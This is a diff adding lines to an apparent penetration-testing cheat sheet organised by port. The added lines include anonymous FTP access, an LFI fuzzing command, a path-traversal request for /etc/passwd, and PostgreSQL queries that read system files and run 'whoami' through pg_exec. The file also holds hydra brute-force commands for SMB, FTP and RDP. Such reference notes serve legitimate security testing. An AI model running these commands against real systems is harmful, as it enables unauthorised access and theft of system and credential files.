@@ -1,6 +1,7 @@
 ### Port 445 (SMB)
 smbclient -N -L //$rhost/ #445
 smbclient -N //$rhost/IPC$ #445
+nmap -p445 --script smb-protocols $rhost | grep "3.11"
 nmap --script smb-vuln* -p139,445 -Pn $rhost
 enum4linux-ng -AC $rhost #445
 nxc smb $rhost -u 'anonymous' -p '' --rid-brute #445
@@ -10,6 +11,7 @@ impacket-lookupsid anonymous@$rhost #445
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost smb; exec zsh'" & disown
 
 ### Port 21 (FTP)
+curl ftp://$rhost/ --user "anonymous:anonymous"
 ftp anonymous@$rhost #21
 nmap -sV -p21 --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -Pn $rhost
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost ftp; exec zsh'" & disown
@@ -71,6 +73,8 @@ anyHTTP including 8080 etc
 locate admin portals etc using ffuf or google
 curl -s http://$rhost/robots.txt
 curl -s http://$rhost | batcat -s --plain #80
+ffuf -w /path/to/lfi-payloads.txt -u http://$rhost/page?file=FUZZ
+curl "http://$rhost/file?name=../../../../etc/passwd"
 open http://$rhost #80
 ffuf parameter fuzzing - dirsearch, file extensions such as php, txt, zip etc #80
 cewl -d 2 -m 5 -w create_user.txt https://$rhost/  #80
@@ -99,6 +103,9 @@ nmap -sV -p3306 --script mysql-databases -Pn $rhost #3306
 
 ### PostgreSQL (Port 5432)
 psql -h $rhost -U postgres
+psql -h $rhost -U postgres -c "COPY (SELECT pg_read_file('/etc/passwd')) TO STDOUT"
+psql -h $rhost -U postgres -c "COPY (SELECT pg_read_file('C:\\Windows\\win.ini')) TO STDOUT"
+psql -h $rhost -U postgres -c "COPY (SELECT pg_exec('whoami')) TO STDOUT"
 
 ### Port 3389 (RDP)
 qterminal -e "zsh -c 'hydra -I -l \$user -P ~/rockyou.txt -e nsr -t 1 \$rhost rdp; exec zsh'" & disown
